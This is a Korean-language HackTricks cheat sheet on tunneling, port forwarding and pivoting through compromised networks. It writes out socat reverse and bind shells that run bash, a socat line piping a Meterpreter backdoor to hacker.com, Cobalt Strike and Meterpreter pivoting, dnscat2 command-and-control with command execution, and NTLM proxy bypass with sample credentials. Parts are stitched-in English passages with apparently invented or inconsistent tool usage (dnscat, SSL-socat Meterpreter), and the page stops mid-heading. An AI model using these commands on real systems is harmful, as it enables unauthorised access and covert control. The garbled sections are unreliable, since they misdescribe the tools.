# 터널링과 포트 포워딩

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>

## Nmap 팁

{% hint style="warning" %}
**ICMP** 및 **SYN** 스캔은 소켓 프록시를 통해 터널링할 수 없으므로 작동하려면 **핑 탐지를 비활성화**(`-Pn`)하고 **TCP 스캔**(`-sT`)을 지정해야 합니다.
{% endhint %}

## **Bash**

**호스트 -> 점프 -> 내부A -> 내부B**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 그래픽 연결 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### 로컬 포트투포트

SSH 서버에서 새로운 포트 열기 --> 다른 포트
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### 포트2포트

로컬 포트 --> 침해당한 호스트 (SSH) --> 세 번째\_박스:포트
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

로컬 포트 --> 침해당한 호스트 (SSH) --> 어디든지
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### 역 포트 포워딩

이것은 내부 호스트에서 DMZ를 통해 역 쉘을 가져오는 데 유용합니다.
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

두 장치 모두 **루트 권한**이 필요합니다 (새로운 인터페이스를 생성하기 때문입니다) 그리고 sshd 구성에서 루트 로그인을 허용해야 합니다:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
서버 측에서 포워딩 활성화하기
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
클라이언트 측에 새로운 경로 설정하기
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

호스트를 통해 서브네트워크로 모든 트래픽을 **ssh**를 통해 **터널링**할 수 있습니다.\
예를 들어, 10.10.10.0/24로 가는 모든 트래픽을 전달합니다.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
개인 키로 연결하기

To connect to a remote server using a private key, follow these steps:

1. Generate a private/public key pair on your local machine if you don't already have one. You can use tools like `ssh-keygen` to generate the keys.

2. Copy the public key (`id_rsa.pub`) to the remote server. You can use the `ssh-copy-id` command to automatically copy the key to the remote server.

3. Set the correct permissions for the private key file (`id_rsa`). The file should only be readable by the owner. You can use the `chmod` command to set the permissions.

4. Connect to the remote server using the private key. Use the `ssh` command with the `-i` flag to specify the private key file. For example:

   ```bash
   ssh -i /path/to/private_key user@remote_server
   ```

   Replace `/path/to/private_key` with the actual path to your private key file, and `user@remote_server` with the appropriate username and server address.

By using a private key for authentication, you can securely connect to remote servers without the need for a password.
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

로컬 포트 --> 침투된 호스트 (활성 세션) --> 세 번째\_박스:포트
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS는 네트워크 프로토콜로, 프록시 서버를 통해 트래픽을 전달하는 역할을 합니다. SOCKS는 TCP와 UDP 트래픽을 모두 지원하며, 다른 프로토콜과 함께 사용할 수 있습니다. SOCKS는 일반적으로 터널링과 포트 포워딩에 사용됩니다.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
다른 방법:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS 프록시

팀서버에서 모든 인터페이스에서 수신 대기하는 포트를 열어 **비콘을 통해 트래픽을 라우팅**할 수 있습니다.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
이 경우, **포트는 비콘 호스트에서 열립니다**, 팀 서버가 아닌 곳에서 트래픽이 팀 서버로 전송되고 지정된 호스트:포트로 전달됩니다.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
주의:

- Beacon의 역방향 포트 포워드는 개별 기기 간의 릴레이가 아닌 트래픽을 팀 서버로 터널링하기 위해 설계되었습니다.
- 트래픽은 P2P 링크를 포함한 Beacon의 C2 트래픽 내에서 터널링됩니다.
- 고 포트에서 역방향 포트 포워드를 생성하기 위해 **관리자 권한이 필요하지 않습니다**.

### 로컬 rPort2Port

{% hint style="warning" %}
이 경우, 포트는 팀 서버가 아닌 비콘 호스트에서 열리며, 트래픽은 Cobalt Strike 클라이언트로 전송되고 거기서 지정된 호스트:포트로 전달됩니다.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

웹 파일 터널을 업로드해야 합니다: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
클라이언트와 서버에는 **동일한 버전을 사용해야 합니다.**

### 소켓
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 포트 포워딩

Port forwarding은 네트워크 트래픽을 한 컴퓨터의 포트에서 다른 컴퓨터의 포트로 전달하는 기술입니다. 이를 통해 외부에서 내부 네트워크에 접근할 수 있습니다. 포트 포워딩은 다양한 시나리오에서 유용하게 사용될 수 있습니다.

#### 로컬 포트 포워딩

로컬 포트 포워딩은 로컬 컴퓨터의 포트를 원격 서버의 포트로 전달하는 것을 의미합니다. 이를 통해 로컬 컴퓨터에서 실행되는 서비스에 외부에서 접근할 수 있습니다. 예를 들어, SSH를 사용하여 원격 서버에 로그인하고 원격 서버의 웹 서비스에 로컬 브라우저를 통해 접근할 수 있습니다.

#### 원격 포트 포워딩

원격 포트 포워딩은 원격 서버의 포트를 로컬 컴퓨터의 포트로 전달하는 것을 의미합니다. 이를 통해 원격 서버에서 실행되는 서비스에 로컬 컴퓨터에서 접근할 수 있습니다. 예를 들어, 원격 서버에서 실행되는 데이터베이스에 로컬 컴퓨터에서 접근하여 데이터를 조회할 수 있습니다.

#### 다이나믹 포트 포워딩

다이나믹 포트 포워딩은 로컬 컴퓨터를 프록시 서버로 사용하여 다른 호스트의 포트로 트래픽을 전달하는 것을 의미합니다. 이를 통해 로컬 컴퓨터를 통해 인터넷을 사용하는 다른 호스트의 트래픽을 보안적으로 안전하게 전달할 수 있습니다. 예를 들어, VPN을 통해 인터넷에 연결된 호스트의 트래픽을 로컬 컴퓨터를 통해 전달할 수 있습니다.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

역 터널. 터널은 피해자로부터 시작됩니다.\
127.0.0.1:1080에 socks4 프록시가 생성됩니다.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM 프록시**를 통해 피벗하기
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 바인드 쉘 (Bind shell)
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### 리버스 쉘

리버스 쉘은 공격자가 목표 시스템에 접근하기 위해 사용하는 기술입니다. 일반적으로 목표 시스템에서 실행되는 악성 코드를 통해 공격자와의 연결을 설정합니다. 이를 통해 공격자는 목표 시스템에 대한 원격 액세스 권한을 획득할 수 있습니다.

리버스 쉘을 설정하기 위해 공격자는 목표 시스템에 악성 페이로드를 전달해야 합니다. 이를 위해 다양한 기술과 도구를 사용할 수 있습니다. 일반적으로는 소켓 프로그래밍을 통해 공격자와의 연결을 설정하고, 목표 시스템에서 실행되는 악성 코드를 통해 연결을 수립합니다.

리버스 쉘은 편리하고 강력한 기술이지만, 악용될 경우 심각한 보안 위협이 될 수 있습니다. 따라서 이러한 기술을 사용하는 경우 합법적인 목적과 적절한 권한을 가지고 사용해야 합니다.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### 포트2포트

포트2포트는 로컬 포트와 원격 포트 간의 연결을 생성하는 터널링 기술입니다. 이를 통해 로컬 시스템에서 원격 시스템으로 트래픽을 전달할 수 있습니다. 포트2포트는 다양한 시나리오에서 유용하게 사용될 수 있습니다.

#### 로컬 포트 포워딩

로컬 포트 포워딩은 로컬 시스템의 특정 포트를 원격 시스템의 포트로 전달하는 것을 의미합니다. 이를 통해 로컬 시스템에서 실행 중인 서비스에 원격 시스템에서 접근할 수 있습니다. 예를 들어, 원격 서버에 SSH 서비스가 실행 중이고 로컬 시스템에서 SSH 클라이언트를 사용하려는 경우, 로컬 포트 포워딩을 설정하여 로컬 포트를 원격 SSH 서버의 포트로 전달할 수 있습니다.

#### 원격 포트 포워딩

원격 포트 포워딩은 원격 시스템의 특정 포트를 로컬 시스템의 포트로 전달하는 것을 의미합니다. 이를 통해 원격 시스템에서 실행 중인 서비스에 로컬 시스템에서 접근할 수 있습니다. 예를 들어, 로컬 시스템에 웹 서버가 실행 중이고 원격 시스템에서 웹 페이지에 접근하려는 경우, 원격 포트 포워딩을 설정하여 원격 포트를 로컬 웹 서버의 포트로 전달할 수 있습니다.

#### 다이나믹 포트 포워딩

다이나믹 포트 포워딩은 로컬 시스템을 프록시 서버로 사용하여 원격 시스템의 트래픽을 전달하는 것을 의미합니다. 이를 통해 로컬 시스템을 통해 원격 시스템에 접근할 수 있습니다. 예를 들어, 원격 시스템에 접근할 수 없는 네트워크에 연결된 로컬 시스템이 있는 경우, 다이나믹 포트 포워딩을 설정하여 로컬 시스템을 프록시로 사용하여 원격 시스템에 접근할 수 있습니다.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### 소켓을 통한 포트 투 포트

Sometimes, you may encounter a situation where you need to establish a connection between two ports on different systems. This can be useful for various purposes, such as accessing a service running on a remote system through a local port.

In order to achieve this, you can use a technique called "port2port through socks". This technique involves setting up a SOCKS proxy server that acts as an intermediary between the two systems.

Here's how you can do it:

1. Set up a SOCKS proxy server on your local system. You can use tools like `ssh` or `proxychains` to do this. Make sure the proxy server is listening on a specific port.

2. Connect to the remote system using SSH or any other method that allows you to establish a secure connection.

3. Once connected to the remote system, set up a reverse SSH tunnel from the remote system to your local system. This will allow the remote system to connect to the SOCKS proxy server on your local system.

4. Configure the remote system to use the SOCKS proxy server. This can usually be done by setting the `http_proxy` and `https_proxy` environment variables.

5. Finally, establish a connection between the two ports by specifying the remote system's IP address and the port number of the service you want to access.

By following these steps, you can establish a connection between two ports on different systems using a SOCKS proxy server. This technique can be very useful in various scenarios, such as accessing restricted services or bypassing firewalls.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat를 통한 Meterpreter

이 기술은 Meterpreter 세션을 안전하게 전송하기 위해 Socat을 사용하는 방법을 설명합니다.

1. 먼저, Socat을 설치해야 합니다. 다음 명령을 사용하여 설치할 수 있습니다.

```bash
apt-get install socat
```

2. Socat을 사용하여 로컬 포트와 원격 포트를 연결합니다. 다음 명령을 사용합니다.

```bash
socat TCP-LISTEN:4444,reuseaddr,fork SSL:target_ip:4444,cert=server.pem
```

여기서 `target_ip`는 Meterpreter 세션을 전송할 대상 IP 주소입니다.

3. 이제 Meterpreter를 실행하고 다음 명령을 사용하여 Socat을 통해 연결합니다.

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST local_ip
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

여기서 `local_ip`는 로컬 IP 주소입니다.

4. Meterpreter 세션을 얻기 위해 손상된 SSL 연결을 사용합니다. 다음 명령을 사용합니다.

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST local_ip
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

이제 Socat을 통해 Meterpreter 세션을 안전하게 전송할 수 있습니다.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행하여 **인증되지 않은 프록시**를 우회할 수 있습니다:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat 터널

**/bin/sh 콘솔**

클라이언트와 서버 양쪽에 인증서 생성하기
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### 원격 포트투포트

로컬 SSH 포트(22)를 공격자 호스트의 443 포트에 연결합니다.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

이것은 콘솔 PuTTY 버전과 비슷합니다 (옵션은 ssh 클라이언트와 매우 유사합니다).

이 바이너리는 피해자에서 실행되며 ssh 클라이언트이므로 역 연결을 위해 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서만 접근 가능한 포트를 우리 컴퓨터의 포트로 포워딩합니다:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

로컬 관리자 권한이 필요합니다 (모든 포트에 대해)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

시스템에서 **RDP 액세스**가 필요합니다.\
다운로드:

1. [SocksOverRDP x64 바이너리](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통해 패킷을 터널링**하는 역할을 합니다.
2. [Proxifier 휴대용 바이너리](https://www.proxifier.com/download/#win-tab)

클라이언트 컴퓨터에서 **`SocksOverRDP-Plugin.dll`**을 다음과 같이 로드하세요:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **피해자**에게 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화**되었다는 **알림**을 받아야 합니다. 그리고 **127.0.0.1:1080**에서 **수신 대기**할 것입니다.

**RDP**를 통해 **연결**하고, 피해자 컴퓨터에 `SocksOverRDP-Server.exe` 이진 파일을 **업로드**하고 실행하세요:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
이제, 공격자의 컴퓨터에서 포트 1080이 수신 대기 중인지 확인하세요:
```
netstat -antb | findstr 1080
```
이제 [**Proxifier**](https://www.proxifier.com/)를 사용하여 트래픽을 해당 포트를 통해 프록시할 수 있습니다.

## Windows GUI 앱을 프록시로 설정하기

[**Proxifier**](https://www.proxifier.com/)를 사용하여 Windows GUI 앱을 프록시로 설정할 수 있습니다.\
**프로필 -> 프록시 서버**에서 SOCKS 서버의 IP와 포트를 추가합니다.\
**프로필 -> 프록시화 규칙**에서 프록시로 설정할 프로그램의 이름과 프록시로 설정하려는 IP에 대한 연결을 추가합니다.

## NTLM 프록시 우회

이전에 언급한 도구: **Rpivot**\
**OpenVPN**도 이를 우회할 수 있으며, 구성 파일에서 다음 옵션을 설정합니다:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

이는 프록시에 대한 인증을 수행하고 외부 서비스로 전달되는 로컬 포트를 바인딩합니다. 그런 다음이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
예를 들어 포트 443을 전달합니다.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
이제, 예를 들어 피해자에서 **SSH** 서비스를 443번 포트에서 수신 대기하도록 설정한다면, 공격자는 2222번 포트를 통해 연결할 수 있습니다.\
또한, 로컬호스트:443에 연결하는 **meterpreter**를 사용할 수 있으며, 공격자는 2222번 포트에서 수신 대기합니다.

## YARP

Microsoft에서 개발한 역방향 프록시입니다. [여기](https://github.com/microsoft/reverse-proxy)에서 찾을 수 있습니다.

## DNS 터널링

### Iodine

[여기](https://code.kryo.se/iodine/)에서 찾을 수 있습니다.

DNS 쿼리를 사용하여 터널 어댑터를 생성하고 데이터를 터널링하기 위해 두 시스템 모두에서 루트 권한이 필요합니다.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
터널은 매우 느릴 것입니다. 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다. 다음을 사용하세요:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**여기에서 다운로드하세요**](https://github.com/iagox86/dnscat2)**.**

DNS를 통해 C\&C 채널을 설정합니다. 루트 권한이 필요하지 않습니다.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell에서**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용하여 PowerShell에서 dnscat2 클라이언트를 실행할 수 있습니다:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat을 사용한 포트 포워딩**

Port forwarding is a technique used to redirect network traffic from one port on a host to another port on a different host. It can be useful in various scenarios, such as accessing a service running on a remote machine or bypassing firewall restrictions.

In this section, we will explore how to perform port forwarding using dnscat, a tool that allows you to tunnel TCP and UDP traffic over DNS. Dnscat works by encoding the data in DNS queries and responses, making it difficult to detect and block.

To get started, you will need to set up a DNS server that supports wildcard subdomains. This can be done using tools like Dnsmasq or BIND. Once your DNS server is set up, you can proceed with the following steps:

1. Install dnscat on both the client and server machines. You can find the installation instructions in the dnscat GitHub repository.

2. Start the dnscat server on the machine that will receive the forwarded traffic. You can do this by running the following command:

   ```
   dnscat --dns <your_dns_server_ip>
   ```

   Replace `<your_dns_server_ip>` with the IP address of your DNS server.

3. On the client machine, start the dnscat client and specify the server IP address and port to forward the traffic to. Use the following command:

   ```
   dnscat --dns <your_dns_server_ip> --dns-port <your_dns_server_port> --target <target_ip> --target-port <target_port>
   ```

   Replace `<your_dns_server_ip>` and `<your_dns_server_port>` with the IP address and port of your DNS server, and `<target_ip>` and `<target_port>` with the IP address and port of the target machine.

4. Once the client and server are connected, you can access the service running on the target machine by connecting to the client machine's IP address and the port specified in step 3.

   For example, if the client machine's IP address is `192.168.1.100` and the target port is `8080`, you can access the service by navigating to `http://192.168.1.100:8080` in your web browser.

Port forwarding with dnscat can be a powerful technique for bypassing network restrictions and accessing services on remote machines. However, it is important to use this technique responsibly and with proper authorization.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 프록시체인 DNS 변경

프록시체인은 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 소켓 프록시를 통해 터널링합니다. 기본적으로 프록시체인이 사용하는 DNS 서버는 하드코딩된 **4.2.2.2**입니다. 이를 변경하려면 _/usr/lib/proxychains3/proxyresolv_ 파일을 편집하여 IP를 변경하면 됩니다. **Windows 환경**에서는 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.

## Go에서의 터널링

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP 터널링

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

두 시스템 모두에서 루트 권한이 필요하며, 터널 어댑터를 생성하고 ICMP 에코 요청을 사용하여 데이터를 터널링합니다.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**여기에서 다운로드하세요**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/)은 한 줄의 명령어로 솔루션을 인터넷에 노출시키는 도구입니다.**
*노출 URI는 다음과 같습니다:* **UID.ngrok.io**

### 설치

- 계정 생성: https://ngrok.com/signup
- 클라이언트 다운로드:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
#### TCP 터널링

TCP 터널링은 로컬 포트와 원격 서버의 포트를 연결하여 로컬 네트워크에서 원격 서버에 접근할 수 있게 해줍니다.

##### 로컬 포트를 원격 서버로 터널링하기

```bash
$ ngrok tcp <local-port>
```

- `<local-port>`에는 로컬 포트 번호를 입력합니다.

##### 터널링된 포트에 접속하기

터널링된 포트에 접속하려면 다음과 같이 입력합니다.

```bash
$ nc localhost <tunnel-port>
```

- `<tunnel-port>`에는 터널링된 포트 번호를 입력합니다.

#### Tunneling HTTP

HTTP 터널링은 로컬 웹 서버를 인터넷에 공개하기 위해 사용됩니다.

##### 로컬 웹 서버를 원격으로 터널링하기

```bash
$ ngrok http <local-port>
```

- `<local-port>`에는 로컬 웹 서버의 포트 번호를 입력합니다.

##### 터널링된 URL 확인하기

터널링된 URL은 다음과 같이 확인할 수 있습니다.

```bash
$ curl http://localhost:4040/api/tunnels
```

#### Tunneling UDP

UDP 터널링은 로컬 포트와 원격 서버의 포트를 연결하여 UDP 패킷을 전송할 수 있게 해줍니다.

##### 로컬 포트를 원격 서버로 터널링하기

```bash
$ ngrok udp <local-port>
```

- `<local-port>`에는 로컬 포트 번호를 입력합니다.

##### 터널링된 포트에 UDP 패킷 전송하기

터널링된 포트로 UDP 패킷을 전송하려면 다음과 같이 입력합니다.

```bash
$ echo "Hello, ngrok!" | nc -u localhost <tunnel-port>
```

- `<tunnel-port>`에는 터널링된 포트 번호를 입력합니다.
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP를 사용하여 파일 노출하기

To expose files using HTTP, you can set up a simple web server on your local machine and make the files accessible through a specific URL. Here's how you can do it:

1. Choose a directory on your local machine where you want to store the files that you want to expose.

2. Start a web server in that directory. You can use tools like Python's `http.server` module or `SimpleHTTPServer` module to quickly set up a web server. For example, if you have Python installed, you can run the following command in the terminal:

   ```
   python -m http.server
   ```

   This will start a web server on port 8000 by default.

3. Move the files that you want to expose to the chosen directory.

4. Access the files through the web server using the URL `http://localhost:8000/` followed by the file name. For example, if you have a file named `example.txt`, you can access it using the URL `http://localhost:8000/example.txt`.

By following these steps, you can expose files using HTTP and access them through a web browser or any other HTTP client. Keep in mind that this method exposes the files publicly, so make sure to only expose files that you intend to share.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP 호출 스니핑

